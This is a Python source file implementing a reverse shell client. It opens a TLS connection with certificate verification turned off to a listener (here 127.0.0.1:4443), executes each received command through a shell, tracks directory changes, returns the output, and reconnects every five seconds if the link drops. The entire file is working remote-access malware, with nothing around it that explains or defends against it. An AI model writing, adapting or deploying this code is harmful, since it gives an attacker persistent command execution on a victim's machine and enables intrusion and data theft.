import socket
import ssl
import subprocess
import time
import os

HOST = '127.0.0.1'
PORT = 4443

def connect():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            with socket.create_connection((HOST, PORT)) as sock:
                with context.wrap_socket(sock, server_hostname=HOST) as s:
                    cwd = os.getcwd()  # Current working directory
                    while True:
                        try:
                            cmd = s.recv(4096).decode().strip()
                            if not cmd:
                                continue
                            if cmd.lower() == "exit":
                                break

                            if cmd.lower() == "cmd":
                                cmd = "ver && echo. && cd"

                            if cmd.lower().startswith("cd"):
                                path = cmd[3:].strip()
                                new_dir = os.path.join(cwd, path) if not os.path.isabs(path) else path
                                if os.path.isdir(new_dir):
                                    cwd = os.path.abspath(new_dir)
                                    s.sendall((cwd + "\n__end__").encode())
                                else:
                                    s.sendall(b"The system cannot find the path specified.\n__end__")
                                continue

                            result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
                            output = result.stdout + result.stderr
                            if not output:
                                output = "[*] No output returned.\n"
                            s.sendall(output.encode() + b"__end__")

                        except Exception as e:
                            try:
                                s.sendall(f"[!] Error: {e}\n__end__".encode())
                            except:
                                break
        except:
            time.sleep(5)

if __name__ == "__main__":
    connect()
